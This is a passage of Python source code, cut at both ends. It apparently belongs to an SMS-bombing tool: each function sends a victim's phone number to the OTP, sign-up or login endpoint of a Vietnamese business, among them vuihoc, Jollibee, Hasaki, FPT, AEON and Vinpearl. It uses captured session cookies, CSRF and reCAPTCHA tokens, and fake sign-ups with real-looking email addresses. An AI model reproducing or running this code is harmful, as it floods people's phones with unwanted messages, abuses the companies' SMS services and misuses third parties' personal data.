        "duo_theme_json": '{"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":null,"holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://xcdn-cf.vuihoc.vn/assets/duo/theme/tet/2025/web/cdn-tet-animation-flower-big.js","start_time":"2025-01-15 00:00:00","end_time":"2025-02-09 23:59:59"}',
        "_gid": "GA1.2.964259439.1746086828",
        "_ga": "GA1.2.838406960.1746086828",
        "_ga_PR7QKZ61KC": "GS1.1.1746086827.1.1.1746086867.0.0.0",
        "_ga_4BW81DWTX0": "GS1.1.1746086831.1.1.1746086906.60.0.0",
        "number_auth": phone,
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=0, i",
        "referer": "https://vuihoc.vn/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        # 'cookie': 'VERSION=1; WEB_LOP=1; duo_theme_json={"url_title_trailing_image":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/ico-banh-chung-1x.png","color_background_header_1":"#FFC442","color_background_header_2":"#E1271B","header_live_class":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/live_duo.png","url_bell":"https://scontent.vuihoc.vn/assets/duo/theme/tet/2024/web/notification.png","color_background_active":"#FFD476","color_background_hotline":"#FFFFFF","color_text_hotline":"#E1271B","color_text_active":"#E1271B","header_bg_detail_class":null,"holiday_background_animation_type":"tet","holiday_background_animation_cdn":"https://xcdn-cf.vuihoc.vn/assets/duo/theme/tet/2025/web/cdn-tet-animation-flower-big.js","start_time":"2025-01-15 00:00:00","end_time":"2025-02-09 23:59:59"}; _gid=GA1.2.964259439.1746086828; _ga=GA1.2.838406960.1746086828; _ga_PR7QKZ61KC=GS1.1.1746086827.1.1.1746086867.0.0.0; _ga_4BW81DWTX0=GS1.1.1746086831.1.1.1746086906.60.0.0; number_auth=0328396649',
    }
    params = {
        "typeOTP": "1",
    }
    response = requests.get(
        "https://vuihoc.vn/user/verifyAccountkitSMS",
        params=params,
        cookies=cookies,
        headers=headers,
    )
def jlb(phone):
    cookies = {
        "PHPSESSID": "n6ogvgqd00iulfaqd2jl8v9i30",
        "_fbp": "fb.2.1746087278781.495652816758712724",
        "_gid": "GA1.3.2003033383.1746087280",
        "_gat_gtag_UA_191456349_1": "1",
        "_gat_UA-191456349-19": "1",
        "_tt_enable_cookie": "1",
        "_ttp": "01JT5EK06DFBD5SFHFAK9HAKME_.tt.2",
        "form_key": "8YtkmRHuctVgGAp5",
        "mage-cache-storage": "%7B%7D",
        "mage-cache-storage-section-invalidation": "%7B%7D",
        "mage-cache-sessid": "true",
        "mage-messages": "",
        "form_key": "8YtkmRHuctVgGAp5",
        "recently_viewed_product": "%7B%7D",
        "recently_viewed_product_previous": "%7B%7D",
        "recently_compared_product": "%7B%7D",
        "recently_compared_product_previous": "%7B%7D",
        "product_data_storage": "%7B%7D",
        "csp": "1",
        "csd": "1",
        "_ga_7QF2M4198R": "GS1.1.1746087280.1.1.1746087301.39.0.0",
        "_ga": "GA1.1.1286653773.1746087280",
        "_ga_G92EK3GZLQ": "GS1.1.1746087280.1.1.1746087301.39.0.0",
        "_ga_JCDZDB6J2V": "GS1.1.1746087280.1.1.1746087301.39.0.0",
        "ttcsid": "1746087280848::Ise0nalnN7N1Tk4dhSFJ.1.1746087302225",
        "private_content_version": "179ae7ebed54af08ac9364490e7e90ca",
        "_ga_CQTVGTWHFF": "GS1.1.1746087280.1.1.1746087303.37.0.833631266",
        "ttcsid_CNLBDVBC77U4TBB0R76G": "1746087280849::Ha2B992hX7D9poX61DX3.1.1746087336206",
        "ttcsid_CMRLVARC77U705JG557G": "1746087280848::z1UMToQJf7dUHENS-dt-.1.1746087336206",
        "section_data_ids": "%7B%22amfacebook-pixel%22%3A1746088301%2C%22notification_count%22%3A1746088301%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1746088301%2C%22cart%22%3A1746088301%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22ammessages%22%3Anull%2C%22product_area_price%22%3Anull%2C%22customer_voucher%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D",
        "_gcl_au": "1.1.1492290555.1746087279.1755608923.1746087336.1746087336",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://jollibee.com.vn",
        "priority": "u=1, i",
        "referer": "https://jollibee.com.vn/customer/account/create/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        # 'cookie': 'PHPSESSID=n6ogvgqd00iulfaqd2jl8v9i30; _fbp=fb.2.1746087278781.495652816758712724; _gid=GA1.3.2003033383.1746087280; _gat_gtag_UA_191456349_1=1; _gat_UA-191456349-19=1; _tt_enable_cookie=1; _ttp=01JT5EK06DFBD5SFHFAK9HAKME_.tt.2; form_key=8YtkmRHuctVgGAp5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=8YtkmRHuctVgGAp5; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; csp=1; csd=1; _ga_7QF2M4198R=GS1.1.1746087280.1.1.1746087301.39.0.0; _ga=GA1.1.1286653773.1746087280; _ga_G92EK3GZLQ=GS1.1.1746087280.1.1.1746087301.39.0.0; _ga_JCDZDB6J2V=GS1.1.1746087280.1.1.1746087301.39.0.0; ttcsid=1746087280848::Ise0nalnN7N1Tk4dhSFJ.1.1746087302225; private_content_version=179ae7ebed54af08ac9364490e7e90ca; _ga_CQTVGTWHFF=GS1.1.1746087280.1.1.1746087303.37.0.833631266; ttcsid_CNLBDVBC77U4TBB0R76G=1746087280849::Ha2B992hX7D9poX61DX3.1.1746087336206; ttcsid_CMRLVARC77U705JG557G=1746087280848::z1UMToQJf7dUHENS-dt-.1.1746087336206; section_data_ids=%7B%22amfacebook-pixel%22%3A1746088301%2C%22notification_count%22%3A1746088301%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1746088301%2C%22cart%22%3A1746088301%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22ammessages%22%3Anull%2C%22product_area_price%22%3Anull%2C%22customer_voucher%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D; _gcl_au=1.1.1492290555.1746087279.1755608923.1746087336.1746087336',
    }
    data = {
        "form_key": "8YtkmRHuctVgGAp5",
        "success_url": "",
        "error_url": "",
        "lastname": "da",
        "firstname": "asdas",
        "phone": phone,
        "email": "mfcisneros78@gmail.com",
        "password": "jXAcb@Zp6aYd7n2",
        "password_confirmation": "jXAcb@Zp6aYd7n2",
        "dob": "10/04/1991",
        "gender": "1",
        "province_customer": "18",
        "agreement": "1",
        "is_subscribed": "1",
        "otp_type": "create",
        "ip": "171.236.58.142",
    }
    response = requests.post(
        "https://jollibee.com.vn/otp/action/getOTP",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def hasaki(phone):
    cookies = {
        "sessionChecked": "1746087639",
        "HASAKI_SESSID": "dec976bd683a330d5a80838c08320242",
        "form_key": "dec976bd683a330d5a80838c08320242",
        "utm_hsk": "%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%221909359775%22%2C%22utm_term%22%3Anull%7D",
        "PHPSESSID": "7kql08fft0umqk0tc7qd4leni4",
        "_gid": "GA1.2.2026558365.1746087643",
        "_gac_UA-79166816-1": "1.1746087643.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB",
        "_gcl_gs": "2.1.k1$i1746087640$u140347050",
        "_gcl_au": "1.1.929131664.1746087643",
        "__uidac": "0168132edaf57914ade4602e1af3ebc2",
        "__admUTMtime": "1746087642",
        "_gat": "1",
        "_fbp": "fb.1.1746087643123.685803566580988685",
        "_tt_enable_cookie": "1",
        "_ttp": "01JT5EY2D888RE96AAAZHP626H_.tt.1",
        "ttcsid": "1746087643623::kmH7UfsmFsD2vpXzx_Dw.1.1746087643623",
        "_gcl_aw": "GCL.1746087644.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB",
        "_ga": "GA1.1.275318713.1746087643",
        "_ga_MMWZXZ1JWH": "GS1.2.1746087644.1.0.1746087644.60.0.0",
        "__utm": "source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880",
        "__utm": "source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880",
        "__iid": "7895",
        "__iid": "7895",
        "__su": "0",
        "__su": "0",
        "__RC": "25",
        "__R": "1",
        "__uif": "__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338",
        "_ga_40EJN12JB0": "GS1.1.1746087643.1.0.1746087656.47.0.0",
        "_ga_T2KJ07X20R": "GS1.1.1746087643.1.0.1746087656.0.0.0",
        "ttcsid_C6BJ3UMDUP8O9FFUQ110": "1746087643622::srdvwe52wmR7yG5m18A-.1.1746087682247",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i",
        "referer": "https://hasaki.vn/san-pham-ban-chay.html?utm_source=google&utm_medium=cpc&utm_campaign=1909359775&utm_content=148173209880&product_id={productid}&item_id={itemid}&gad_source=1&gad_campaignid=1909359775&gbraid=0AAAAACw4VS0PXIzMTklEXSGzTgbEC-F2U&gclid=Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        # 'cookie': 'sessionChecked=1746087639; HASAKI_SESSID=dec976bd683a330d5a80838c08320242; form_key=dec976bd683a330d5a80838c08320242; utm_hsk=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%221909359775%22%2C%22utm_term%22%3Anull%7D; PHPSESSID=7kql08fft0umqk0tc7qd4leni4; _gid=GA1.2.2026558365.1746087643; _gac_UA-79166816-1=1.1746087643.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB; _gcl_gs=2.1.k1$i1746087640$u140347050; _gcl_au=1.1.929131664.1746087643; __uidac=0168132edaf57914ade4602e1af3ebc2; __admUTMtime=1746087642; _gat=1; _fbp=fb.1.1746087643123.685803566580988685; _tt_enable_cookie=1; _ttp=01JT5EY2D888RE96AAAZHP626H_.tt.1; ttcsid=1746087643623::kmH7UfsmFsD2vpXzx_Dw.1.1746087643623; _gcl_aw=GCL.1746087644.Cj0KCQjwt8zABhDKARIsAHXuD7YMt3nA21kmq6Zmr6AvxmFF-6GsWdkN9CBbxyUjq8SJd1N4ZzV2YHwaAuKdEALw_wcB; _ga=GA1.1.275318713.1746087643; _ga_MMWZXZ1JWH=GS1.2.1746087644.1.0.1746087644.60.0.0; __utm=source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880; __utm=source%3Dgoogle%7Cmedium%3Dcpc%7Ccampaign%3D1909359775%7Ccontent%3D148173209880; __iid=7895; __iid=7895; __su=0; __su=0; __RC=25; __R=1; __uif=__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338; _ga_40EJN12JB0=GS1.1.1746087643.1.0.1746087656.47.0.0; _ga_T2KJ07X20R=GS1.1.1746087643.1.0.1746087656.0.0.0; ttcsid_C6BJ3UMDUP8O9FFUQ110=1746087643622::srdvwe52wmR7yG5m18A-.1.1746087682247',
    }
    params = {
        "api": "user.verifyUserName",
        "username": phone,
    }
    response = requests.get(
        "https://hasaki.vn/ajax", params=params, cookies=cookies, headers=headers
    )
def ivivu(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "Bearer",
        "content-type": "application/json",
        "origin": "https://member.ivivu.com",
        "priority": "u=1, i",
        "referer": "https://member.ivivu.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    }
    json_data = {
        "fullName": "duc tyuyen",
        "email": phone,
        "password": "asdasdasdsadraww34q3A",
        "recaptchaToken": "03AFcWeA5gsMmlSeYH_cs9WrMrVUG4K67PiSjCr6zVJ3NAhaOw_V48etWHedavhZucFLaFWNI8NIavbLj3CpkS93SNxbrPkKCdeYrOUEmYrZtw-eC7Ebg_TOawnVNzTrWZaxhjSDmQ-htH76HNhjI42HaiBq5a8MPzLpcm6etKC0aJQV_Qls3c_dI5kbYUmKuLDTTYR5QwDnndy7JmvGHxAKBTZnwS2wun2U5psVSAmJmK1I55z6IoMSIVUc1lTrCkL10m02MrILOqeGRmtxjFVV7zSPTmL9KhILavheFwd0Z12-PFTwE3MFp1qIHLpmQ3-uAH32rV9aa1vEzfPGKWheE9u5VO6dzvGDmwLu3pxP_b_jDKKjVqmH8KaOO4SX9Qh-lgwCndSBcbcHtHmqfzhM7M7zol2bGi7XDHvY9Lxjo66ZxZeb7p4u_UktijQGccrzEmQnysD1U4qv9pfQpwWhEqvXfTWe5l1w_EISX6DYyZpzTgDi5SvnIDgsbYzDRODONh1ZKWNgQLLVFUvpDFwirDovaaDUSKnLcB5TA_O339CDBnSgy4-Cc4QOCQ6H99tqUfqGsH80e95kOnGzjnVYI4vO1tJ_IhX6Z2yhLUV2lcKpvBNmQ7qatT_DoOJDA_P9Sk1jpivNvzRBMMmHxSV8F1fXqqP0OeQ1L4l0ZjOpb_aUSK46TiKWraqLwPgS3c2NqQthtwwUJqmNc32L0qqPWq7qjw7wiWRS-DCz-y2NAE6f5mIc0Jr5-DWyfQPan9q-NdVjRoQ622o-qm__3f1zD8X4OqYFkwkbCdoIPPYAG3_JT6qExKSI0Oz4bZ7OQcj1i9RUysWUVcUOv7sh9GqfMhNCNIjnI7370esGJPuvo2wV5kuRf6j4LbJ6ARu6Nmgwxr_nzCfDIyN09efNYY6t6n4ELp61uLhqIaOcQdr-uL3cTRUzpO98Hi-bc-_ypiVdyCVLHGbNA5SQS90d3zMI2gwrrUyFYd_Q2uYXOURqxcrOvQq86YgHY4b4HfOmev0cz9FUaXbQG0BDX4EW5Cyy9QGeyL_NEsiJty-37dHbg0xH6Hn_6vvp-7mQ4-JCH9tuQbycPxzB_Rvd9MPUksRw1fFsKKCWmEru5MogCoFcmcQSc4FsyMzkETGmV518vw3KoR2s6Igyp9PJ1abnybyz90qdYGIaxo9-46h8-rN8G_23CZ02zbLSQDmYyIyHqbMc3ws1osXSeyxcRK75ZDSrJsOB1FeJLAXE86bWhB7k5MgXm1myZBah_fqjMXE-W148_Uk2fF11Fjwn0pPnDxMcHDuNYmdpcNu2ZKy6HmvaTWz7sEg30rcJtiZfWntCKGcpEWrRhldsYZsAakbIcXNefTgMmT4QkcwSWV7hEl4qXw3Mys4muzJe7eN1s3ohilUj3pCKKCyB2UGBemIEeBmNMPf2jf7Pas3YXdC6QrzNeskrYInkB4xaUw_eHmtOlIMNRXAIat5u-eTkq1ml4de6CvhdYSRZVA4N1synTgbk82Fd_Md_aBP9S4y2KR1zY8jOZsQOs5psbQy_nogASsb_FclCF-r75uyA4djuiIXNQG6yRuj58DzFMhBBgdinTkVZJCN5NEJnpLzOtq2o_p98E3G0Bo9Dy-PsU09xYEQiGrX9FXADR_E3FtFq_mV4w-7nkVaUh48ed2I9riQ2Huvlydz_4qc1jem1UJBV4t-y8MuCTxlHQgLFBEE6q0PbWAwiBnaDDXoS6YtjAD0u_NtRl26xCUH5Paf-rg6eVsgIgg0P6dS8Wxpbwd6tR-28V0wPhB1xhrMsWzVvv96YnsfPFqXqokn-1X5AxVV1rSvYjcy99XXmWDL7BBRRK1irq8QKnF6gayw6_QAcNhGgbHP2wko8BQe8miBHX6OcWsb2wEvur3Q5IGd0jUETHowQEumMJKaZ4G28fhXmn5tDmSbyPPlp8QuoavqGQg7zgZGAKMsS55FdcBwRQjT2JFrUy9_D24nCxiMRC_R--NdgfL6oh_Oqiti2KLG3dXKN4GHw69PG0DLwvdOpbP15u3Z4tw5_EmRl16gcJdfzhR4V9K1MLIxwDDGjhijiexpvcu73WmpEPVu2EUTBpHUMIVdjKJ0jhG77wDd9k1p3tzDyWmItA1SjuIA9lRcA",
    }
    response = requests.post(
        "https://apiportal.ivivu.com/api/account/registerV2",
        headers=headers,
        json=json_data,
    )
def longchau(phone):
    cookies = {
        "INGRESSCOOKIE": "1746088485.227.58.68199|7fba285e5548cf27d0d7a70b981762e8",
        "fptid-antiforgery": "CfDJ8K4dvrnRzclGrO7gfc8sD9IddKcCAZpL54MFemo4XRkStnnkfTxGJEUNmV1eHDYy8sLWasM3qJNhNXe9B0o9byi9cY4MZC8cHKVeH07idba6G-2ojiGMHBvyVM-bJ85OGyH4jYq0KiI_n3A_INqB90Q",
        "oauth2_authentication_csrf_insecure": "MTc0NjA4ODQ4NHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJREptTjJRMFkyWTJZekF6TnpRMVkySTVObVl3WmprMU9HUXdORGxtTjJaa3zbSH9D-F1TULGXBnJd-HaTxl7msvJ3SsbznQSNhuVwaQ==",
        "fptid-session": "CfDJ8K4dvrnRzclGrO7gfc8sD9LCgIPrcRWWONgq8z5DlCh6nMjqXc4nICN9fBvL3v8SdKrAJegeZwYJ%2FzLrp6%2FZFpXfrTtDhauGZhnyJUL3SE8HYhySn7oGyfIKJ%2Frpv%2BG%2BGc4csXirkBb8sBvbBjKkz6UqesYWyuM8U34bDPMSTbm6",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://accounts.fpt.vn",
        "Referer": "https://accounts.fpt.vn/sso/Auth/Identifier?challenge=06e34accbbb446b1ae6da0c4d36f488a",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "X-CSRF-TOKEN": "CfDJ8K4dvrnRzclGrO7gfc8sD9LqeoIUzwPygMCsNOsju5531ldlDxB_6dXRmXoXMwHbaorvEoU7PMxHXuxk4w32PcGdQjYpn1oXkgDpVcyvXIJGCCIqmtGJQi8HHVsejwpoywazkxJBgVN63JikHlbHE4Q",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        # 'Cookie': 'INGRESSCOOKIE=1746088485.227.58.68199|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8K4dvrnRzclGrO7gfc8sD9IddKcCAZpL54MFemo4XRkStnnkfTxGJEUNmV1eHDYy8sLWasM3qJNhNXe9B0o9byi9cY4MZC8cHKVeH07idba6G-2ojiGMHBvyVM-bJ85OGyH4jYq0KiI_n3A_INqB90Q; oauth2_authentication_csrf_insecure=MTc0NjA4ODQ4NHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJREptTjJRMFkyWTJZekF6TnpRMVkySTVObVl3WmprMU9HUXdORGxtTjJaa3zbSH9D-F1TULGXBnJd-HaTxl7msvJ3SsbznQSNhuVwaQ==; fptid-session=CfDJ8K4dvrnRzclGrO7gfc8sD9LCgIPrcRWWONgq8z5DlCh6nMjqXc4nICN9fBvL3v8SdKrAJegeZwYJ%2FzLrp6%2FZFpXfrTtDhauGZhnyJUL3SE8HYhySn7oGyfIKJ%2Frpv%2BG%2BGc4csXirkBb8sBvbBjKkz6UqesYWyuM8U34bDPMSTbm6',
    }
    json_data = {
        "Username": phone,
        "Challenge": "06e34accbbb446b1ae6da0c4d36f488a",
    }
    response = requests.post(
        "https://accounts.fpt.vn/sso/partial/username",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def inc(phone):
    headers = {
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Origin": "https://www.best-inc.vn",
        "Referer": "https://www.best-inc.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "accept": "application/json",
        "authorization": "null",
        "content-type": "application/json",
        "lang-type": "vi-VN",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "x-auth-type": "WEB",
        "x-lan": "VI",
        "x-nat": "vi-VN",
        "x-timezone-offset": "-7",
    }
    params = {
        "code": "30194b18b0cef05ea25dfd04cd2a61ac",
        "instanceId": "50ea502c-c44f-4f5e-b8ac-16c051767b83",
        "validate": "cf890f76ea99fb13037dab9267e64d49",
    }
    json_data = {
        "phoneNumber": phone,
        "verificationCodeType": 1,
    }
    response = requests.post(
        "https://v9-cc.800best.com/uc/account/sendSignUpCode",
        params=params,
        headers=headers,
        json=json_data,
    )
def eaone(phone):
    cookies = {
        "crumb": "AfT5jHZE-xLDuRqM8Y-OIPriyak8lYif5LdMd1H6agU",
        "deviceId": "bc7ccfa3-0e31-4576-b08a-3c5c125b2b28",
        "i18next": "vi-VN",
        "_gcl_au": "1.1.1576847938.1746105354",
        "_ga": "GA1.1.320500299.1746105355",
        "_ym_uid": "1746105359521230216",
        "_ym_d": "1746105359",
        "_fbp": "fb.1.1746105361243.627593510266440100",
        "_ym_isad": "2",
        "_ym_visorc": "w",
        "locationIdentifierIds": "6476ec02b597582eddf08b8d",
        "selectedCity": "T%E1%BB%89nh%20B%E1%BA%AFc%20Ninh",
        "selectedDistrict": "Huy%E1%BB%87n%20L%C6%B0%C6%A1ng%20T%C3%A0i",
        "selectedWard": "X%C3%A3%20Tr%E1%BB%ABng%20X%C3%A1",
        "locationCaptured": "true",
        "aeon-vn-prodnxweb.sid": "Fe26.2**770e5699ebeb007bef7922be131e0b32b59b9b923807b2ee6e89b17a003eb769*ghl94JZ3bRmV1TT1OwEoBw*Yf9h0XooqJ9HBJ3TZkxSEyzJonywAeVOCJPlCPCoHGE7bLQQeMj6juSS1cVAwtel**a68648d8d50ed16ec5f82a6012d04077ac1d59100fe081c4be8ae88c3c4f8feb*NNMI7lKB69ZiL0d1G1Jm7yGfoD8hVzdabIo5_gu7Fsc",
        "superSession": "{%22id%22:%22bc7ccfa3-0e31-4576-b08a-3c5c125b2b28-1746105355266%22%2C%22expiry%22:1746107179692}",
        "datadome": "~Z7aIPPlC7sJ2s~w0BCabsOzW8pYVnoPq7AiFtso~ZJmbE9ulZgAfPAhShabOCJBOLCzl1yPVRm99rpP7uP40DfD9~w8ONq2AblGVj7kIODKUTQHPM6ti6Ol~GrZZjql",
        "_ga_DSESGQJZC8": "GS1.1.1746105355.1.1.1746105410.5.0.0",
        "_dd_s": "rum=0&expire=1746106318905",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "api-json": "true",
        "content-type": "application/json",
        "origin": "https://aeoneshop.com",
        "priority": "u=1, i",
        "referer": "https://aeoneshop.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-csrf-token": "AfT5jHZE-xLDuRqM8Y-OIPriyak8lYif5LdMd1H6agU",
    }
    json_data = {
        "email": "erikastephanie468@gmail.com",
        "phone": phone,
        "type": "userRegistration",
    }
    response = requests.post(
        "https://aeoneshop.com/api/issue-otp",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def vin(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi-VN",
        "access-control-allow-headers": "Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers",
        "authorization": "Bearer undefined",
        "content-type": "application/json",
        "origin": "https://booking.vinpearl.com",
        "priority": "u=1, i",
        "referer": "https://booking.vinpearl.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-display-currency": "VND",
    }
    json_data = {
        "channel": "vpt",
        "username": phone,
        "type": 1,
        "OtpChannel": 1,
    }
    response = requests.post(
        "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
        headers=headers,
        json=json_data,
    )
def aha(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://app.ahamove.com",
